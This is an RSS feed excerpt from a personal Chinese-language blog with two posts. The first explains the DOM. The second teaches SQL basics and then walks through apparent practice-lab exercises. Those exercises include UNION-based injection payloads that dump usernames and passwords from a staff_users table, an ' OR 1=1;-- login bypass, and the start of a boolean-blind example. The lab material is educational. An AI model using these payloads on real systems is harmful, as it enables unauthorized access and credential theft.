&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.w3.org/TR/REC-DOM-Level-1/introduction.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;什么是文档对象模型？ &amp;mdash; What is the Document Object Model?&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;dom-是什么&#34;&gt;DOM 是什么？
&lt;/h2&gt;&lt;p&gt;想象一下，你有一张房子的&lt;strong&gt;建筑蓝图&lt;/strong&gt;，上面画着房子的每一个部分：墙、门、窗户、屋顶等等。DOM 就像是网页的“蓝图”。当你打开一个网页，浏览器会把网页的 HTML 代码（那些 &lt;code&gt;&amp;lt;html&amp;gt;、&amp;lt;div&amp;gt;、&amp;lt;p&amp;gt;&lt;/code&gt; 标签）解析成一个树状结构，这个结构就是 DOM。它把网页里的每一个元素（比如标题、段落、图片）都整理得清清楚楚，让计算机（特别是 JavaScript）能找到它们、操作它们。&lt;/p&gt;
&lt;p&gt;简单来说，DOM 是网页的&lt;strong&gt;骨架图&lt;/strong&gt;，它把网页的内容变成一个个“节点”（node），这些节点就像蓝图上的标记点，互相之间还有父子关系、兄弟关系，形成一个大树。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;title&amp;gt;我的网页&amp;lt;/title&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;h1&amp;gt;欢迎&amp;lt;/h1&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;p&amp;gt;这是一个段落。&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在这个 HTML 里，DOM 会把它变成一个树形结构：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;html&amp;gt; 是根节点，就像树的树根，整个网页的起点。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;html&amp;gt; 下面有两个“孩子”：&amp;lt;head&amp;gt; 和 &amp;lt;body&amp;gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;head&amp;gt; 里有个孩子 &amp;lt;title&amp;gt;，它的内容是“我的网页”。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;body&amp;gt; 里有两个孩子：&amp;lt;h1&amp;gt;（内容是“欢迎”）和 &amp;lt;p&amp;gt;（内容是“这是一个段落。”）。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;这就像一个家庭的家谱：&amp;lt;html&amp;gt; 是爷爷，&amp;lt;head&amp;gt; 和 &amp;lt;body&amp;gt; 是他的两个孩子，&amp;lt;title&amp;gt; 是 &amp;lt;head&amp;gt; 的孩子，&amp;lt;h1&amp;gt; 和 &amp;lt;p&amp;gt; 是 &amp;lt;body&amp;gt; 的孩子。每个节点都是一个“对象”，有自己的属性，比如 &amp;lt;p&amp;gt; 的 innerHTML 属性就是“这是一个段落。”。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;dom-有什么用&#34;&gt;DOM 有什么用？
&lt;/h2&gt;&lt;p&gt;DOM 的牛逼之处在于，它让 &lt;strong&gt;JavaScript&lt;/strong&gt; 能和网页互动。有了 DOM，JavaScript 就像一个装修工人，可以拿着网页的蓝图（DOM）去干活：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;查看&lt;/strong&gt;：找到某个节点，看看它是什么内容。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;修改&lt;/strong&gt;：比如把 &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; 的文字从“这是一个段落。”改成“这是新段落！”。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;添加&lt;/strong&gt;：在 &lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt; 里加一个新的 &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; 节点。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;删除&lt;/strong&gt;：把某个节点去掉。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举个例子：你想做一个网页，用户点一个按钮，页面上的文字就变了。你可以用 JavaScript 写代码，通过 DOM 找到那个文字所在的节点，然后改它的内容。比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;找到 &amp;lt;p&amp;gt; 节点 let paragraph = document.querySelector(&amp;#34;p&amp;#34;); // 修改它的内容 paragraph.innerHTML = &amp;#34;文字被我改啦！&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;再比如，你想做一个待办事项列表，用户点按钮就能添加新任务。这也是通过 DOM 实现的：JavaScript 创建一个新节点（比如 &lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt;），然后把它加到列表里。&lt;/p&gt;
&lt;h2 id=&#34;dom-是桥梁&#34;&gt;DOM 是桥梁
&lt;/h2&gt;&lt;p&gt;所以，DOM 就像是网页（HTML）和 JavaScript 之间的“翻译官”或者“桥梁”。HTML 负责写出网页的内容和结构，DOM 把这些内容变成一个树形结构，JavaScript 通过 DOM 来动态地控制网页，让网页不再是静态的，而是可以互动、有变化的。&lt;/p&gt;
&lt;h2 id=&#34;小结&#34;&gt;小结
&lt;/h2&gt;&lt;p&gt;用最简单的话说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;DOM 是网页的树形蓝图&lt;/strong&gt;，把每个元素都变成节点。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JavaScript 通过 DOM 操作网页&lt;/strong&gt;，可以改内容、加东西、删东西。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;它让网页变得活起来&lt;/strong&gt;，能根据用户的操作动态变化。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>SQL注入基础</title>
        <link>https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/73aeab67fb4786d5331bab4f3b2452827dba9d186069cdc60db0ecfab89b34c5.png" alt="Featured image of post SQL注入基础" /&gt;&lt;h1 id=&#34;sql注入&#34;&gt;SQL注入
&lt;/h1&gt;&lt;p&gt;SQL 语法不区分大小写。&lt;/p&gt;
&lt;h2 id=&#34;sql基础&#34;&gt;SQL基础
&lt;/h2&gt;&lt;h3 id=&#34;select&#34;&gt;SELECT
&lt;/h3&gt;&lt;p&gt;我们将学习的第一种查询类型是用于从数据库中检索数据的 SELECT 查询。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160026857.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;第一个单词 SELECT 告诉数据库我们想要检索一些数据;* 告诉数据库我们想从表中接收所有列。例如，该表可能包含三列（id、username 和 password）。“from users” 告诉数据库我们想要从名为 users 的表中检索数据。最后，末尾的分号告诉数据库这是查询的结束。&lt;/p&gt;
&lt;p&gt;下一个查询与上述查询类似，但这次，我们不是使用 * 返回数据库表中的所有列，而是只请求 username 和 password 字段。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select username,password from users;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160107670.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;与第一个查询一样，以下查询使用 * 选择器返回所有列，然后 “LIMIT 1” 子句强制数据库仅返回一行数据。将查询更改为 “LIMIT 1,1” 会强制查询跳过第一个结果，然后 “LIMIT 2,1” 会跳过前两个结果，依此类推。您需要记住，第一个数字告诉数据库您希望跳过多少个结果，第二个数字告诉数据库要返回多少行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users LIMIT 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160133299.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160158890.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回 username 等于 admin 的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username != &#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160228981.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回 username &lt;strong&gt;不&lt;/strong&gt; 等于 admin 的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39; or username=&#39;jon&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160256822.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回用户名等于 admin 或 jon 的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39; and password=&#39;p4ssword&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160336441.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回用户名等于 &lt;strong&gt;admin&lt;/strong&gt; 且密码等于 &lt;strong&gt;p4ssword&lt;/strong&gt; 的行.&lt;/p&gt;
&lt;h4 id=&#34;like&#34;&gt;like
&lt;/h4&gt;&lt;p&gt;使用 like 子句允许您指定不完全匹配，而是以特定字符开头、包含或结尾的数据，方法是选择放置由百分号表示的通配符的位置。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username like &#39;%n&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160440356.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这将返回用户名以字母 n 结尾的任何行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username like &#39;%mi%&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160504321.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这将返回用户名中包含字符 &lt;strong&gt;mi&lt;/strong&gt; 的任何行。&lt;/p&gt;
&lt;h3 id=&#34;union&#34;&gt;UNION
&lt;/h3&gt;&lt;p&gt;UNION 语句将两个或多个 SELECT 语句的结果组合在一起，以从单个或多个表中检索数据;此查询的规则是 UNION 语句必须在每个 SELECT 语句中检索相同数量的列，列必须具有相似的数据类型，并且列顺序必须相同。这听起来可能不是很清楚，所以让我们使用下面的类比。假设一家公司想要为所有客户和供应商创建一个地址列表，以便发布新目录。我们有一个名为 customers 的表，其中包含以下内容：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160608318.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;另一个表叫 suppliers，内容如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160630628.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;使用以下 SQL 语句，我们可以从两个表中收集结果并将它们放入一个结果集中：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160656676.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;insert&#34;&gt;INSERT
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;INSERT&lt;/strong&gt; 语句告诉数据库我们希望在表中插入一行新数据。 &lt;strong&gt;“into users”&lt;/strong&gt; 告诉数据库我们希望将数据插入到哪个表中， &lt;strong&gt;“（username，password）”&lt;/strong&gt; 提供我们提供数据的列，然后 &lt;strong&gt;“values （&amp;lsquo;bob&amp;rsquo;，&amp;lsquo;password&amp;rsquo;）”;&lt;/strong&gt; 提供以前指定的列的数据。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;insert into users (username,password) values (&#39;bob&#39;,&#39;password123&#39;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160737067.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;update&#34;&gt;UPDATE
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;UPDATE&lt;/strong&gt; 语句告诉数据库我们希望更新表中的一行或多行数据。您使用 “&lt;strong&gt;update %tablename% SET&lt;/strong&gt;” 指定要更新的表，然后选择要更新的一个或多个字段，以逗号分隔的列表，例如 “&lt;strong&gt;username=&amp;lsquo;root&amp;rsquo;，password=&amp;lsquo;pass123&amp;rsquo;&lt;/strong&gt;”，最后，类似于 SELECT 语句，您可以使用 where 子句准确指定要更新的行，例如 “&lt;strong&gt;where username=&amp;lsquo;admin;&lt;/strong&gt;“&lt;/p&gt;
&lt;p&gt;&lt;code&gt;update users SET username=&#39;root&#39;,password=&#39;pass123&#39; where username=&#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160817369.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;delete&#34;&gt;DELETE
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;DELETE&lt;/strong&gt; 语句告诉数据库我们希望删除一行或多行数据。除了缺少要返回的列之外，此查询的格式与 SELECT 非常相似。您可以使用 &lt;strong&gt;where&lt;/strong&gt; &lt;strong&gt;子句精确&lt;/strong&gt;指定要删除的数据，并使用 LIMIT 子句指定要删除的行 数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;delete from users where username=&#39;martin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160846187.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;delete from users;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于查询中未使用 WHERE 子句，因此所有数据都已从表中删除。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160925268.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;基础做题&#34;&gt;基础做题
&lt;/h2&gt;&lt;h3 id=&#34;in-band-sql-injection&#34;&gt;In-Band SQL Injection
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318163151079.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;查询库&#34;&gt;查询库
&lt;/h4&gt;&lt;p&gt;利用union查询的原理，先确定回显的位置。&lt;/p&gt;
&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,3&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以看到页面情况，有三个回显位置&lt;/p&gt;
&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,database()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318162957019.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;可以知道database的名字：sqli_one&lt;/p&gt;
&lt;h4 id=&#34;查询表&#34;&gt;查询表
&lt;/h4&gt;&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#39;sqli_one&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在此查询中，需要学习一些新内容。首先，方法 &lt;strong&gt;group_concat（）&lt;/strong&gt; 从多个返回的行中获取指定的列（在我们的例子中为 table_name），并将其放入一个以逗号分隔的字符串中。接下来是 &lt;strong&gt;information_schema&lt;/strong&gt; 数据库;数据库的每个用户都可以访问它，它包含有关该用户有权访问的所有数据库和表的信息。在这个特定的查询中，我们有兴趣列出 sqli_one 数据库中的所有 表，即 article 和 staff_users。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318163513022.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;由于第一级旨在发现 Martin 的密码，因此 staff_users 表是我们感兴趣的。我们可以再次利用 information_schema 数据库，通过以下查询找到此表的结构。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = &#39;staff_users&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318163803767.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这与前面的 SQL 查询类似。但是，我们要检索的信息已从 table_name 更改为 &lt;strong&gt;column_name&lt;/strong&gt;，我们在 information_schema 数据库中查询的表已从 tables 更改为 &lt;strong&gt;columns&lt;/strong&gt;，并且我们正在搜索 table_name 列值为 staff_users 的任何行&lt;/p&gt;
&lt;p&gt;查询结果为 staff_users 表提供三列：id、password 和 username。我们可以使用以下查询的 username 和 password 列来检索用户的信息。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0 UNION SELECT 1,2,group_concat(username,&#39;:&#39;,password SEPARATOR &#39;&amp;lt;br&amp;gt;&#39;) FROM staff_users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;同样，我们使用 group_concat 方法将所有行返回到一个字符串中，使其 更易于阅读。我们还添加了 &lt;strong&gt;，&amp;rsquo;：&amp;rsquo;，&lt;/strong&gt; 以将用户名和密码彼此分开。我们没有用逗号分隔，而是选择了 &lt;code&gt;HTML &amp;lt;br&amp;gt;&lt;/code&gt; 标签，该标签强制每个结果位于单独的行上，以便于阅读。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318164023522.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;身份认证绕过盲注&#34;&gt;身份认证绕过盲注
&lt;/h3&gt;&lt;p&gt;与带内 SQL 注入不同，我们可以直接在屏幕上看到攻击的结果，而盲 SQLi 是指我们几乎没有收到反馈来确认我们注入的查询是否真的成功，这是因为错误消息已被禁用，但无论如何注入仍然有效。您可能会感到惊讶，我们只需要一点点反馈即可成功枚举整个数据库。&lt;/p&gt;
&lt;p&gt;最直接的盲 SQL 注入技术之一是绕过身份验证方法，例如登录表单。在这种情况下，我们对从数据库中检索数据并不那么感兴趣;我们只想通过登录。&lt;/p&gt;
&lt;p&gt;连接到用户数据库的登录表单的开发方式通常使 Web 应用程序对用户名和密码的内容不感兴趣，而更关心两者是否在 users 表中形成匹配的对。简单来说，Web 应用程序会询问数据库，“您有用户名为 bob 的用户，密码为 bob123 吗？ 数据库回答 Yes 或 No （true/false），并且根据该答案，指示 Web 应用程序是否允许您继续。&lt;/p&gt;
&lt;p&gt;考虑到上述信息，没有必要枚举有效的用户名/密码对。我们只需要创建一个以 yes/true 回复的数据库查询。&lt;/p&gt;
&lt;h4 id=&#34;实际&#34;&gt;实际：
&lt;/h4&gt;&lt;p&gt;SQL 注入示例的第二级显示了这个确切的示例。我们可以在标有 “SQL Query” 的框中看到，对数据库的查询如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;%username%&#39; and password=&#39;%password%&#39; LIMIT 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注意：%username% 和 %password% 值取自登录表单字段。SQL Query （SQL 查询） 框中的初始值将为空，因为这些字段当前为空。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;要将其转换为始终返回 true 的查询，我们可以在 password 字段中输入以下内容：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&#39; OR 1=1;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这会将 SQL 查询转换为以下内容：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;&#39; and password=&#39;&#39; OR 1=1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为 1=1 是 true 语句，并且我们使用了 &lt;strong&gt;OR&lt;/strong&gt; 运算符，所以这将始终导致查询返回 true，这满足 Web 应用程序逻辑，即数据库找到了有效的用户名/密码组合，并且应该允许访问。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318164540872.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;基于布尔盲注&#34;&gt;基于布尔盲注
&lt;/h3&gt;&lt;p&gt;基于布尔值的 SQL 注入是指我们从注入尝试中收到的响应，可以是 true/false、yes/no、on/off、1/0 或任何只能有两个结果的响应。该结果确认了我们的 SQL Injection payload 成功或失败。在第一次检查时，您可能会觉得这种有限的回答无法提供太多信息。不过，仅通过这两个响应，就可以枚举整个数据库结构和内容。&lt;/p&gt;
&lt;h4 id=&#34;实际-1&#34;&gt;实际：
&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318164756211.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;览器正文包含 &lt;strong&gt;{“taken”：true}&lt;/strong&gt;。此 API 端点复制了许多订阅表单上的常见功能，该功能检查用户名是否已注册，以提示用户选择不同的用户名。 由于 &lt;strong&gt;taken&lt;/strong&gt; 的值设置为 &lt;strong&gt;true&lt;/strong&gt;，因此我们可以假设用户名 admin 已注册。我们可以通过将模拟浏览器地址栏中的用户名从 &lt;strong&gt;admin&lt;/strong&gt; 更改为 &lt;strong&gt;admin123&lt;/strong&gt; 来确认这一点，按下 Enter 键后，你会看到所采用的值 现在已更改为 false&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username = &#39;%username%&#39; LIMIT 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们唯一可以控制的输入是查询字符串中的用户名，我们必须使用它来执行 SQL 注入。将用户名保持为 &lt;strong&gt;admin123&lt;/strong&gt;，我们可以开始附加到此内容以尝试使数据库确认 true 内容，将 taken 字段的状态从 false 更改为 true。&lt;/p&gt;
